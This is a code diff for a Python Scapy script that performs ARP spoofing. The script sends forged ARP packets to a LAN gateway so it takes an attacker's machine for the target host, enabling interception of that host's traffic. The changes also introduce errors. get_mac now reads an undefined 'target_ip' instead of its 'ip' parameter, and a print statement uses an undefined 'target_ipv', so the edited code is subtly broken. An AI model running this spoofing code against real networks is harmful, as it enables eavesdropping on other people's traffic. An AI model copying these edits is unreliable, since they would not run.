@@ -2,12 +2,12 @@ import scapy.all as scapy
 
 
 
-def spoof(gateway_ip, gateway_mac, ip):
-    spoofed_arp_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=ip)
+def spoof(gateway_ip, gateway_mac, target_ip):
+    spoofed_arp_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
     scapy.send(spoofed_arp_packet)
 
 def get_mac(ip):
-    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) 
+    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=target_ip) 
     reply = scapy.srp(arp_request) 
     if reply:
         return reply[0][1].src 
@@ -18,7 +18,7 @@ def wait_till_mac_found(ip):
     while not mac:
         mac = get_mac(ip)
         if not mac:
-            print("MAC address for {} not found \n".format(ip))
+            print("MAC address for {} not found ".format(target_ipv))
     return mac
 
 gateway_ip = "192.168.20.1" 
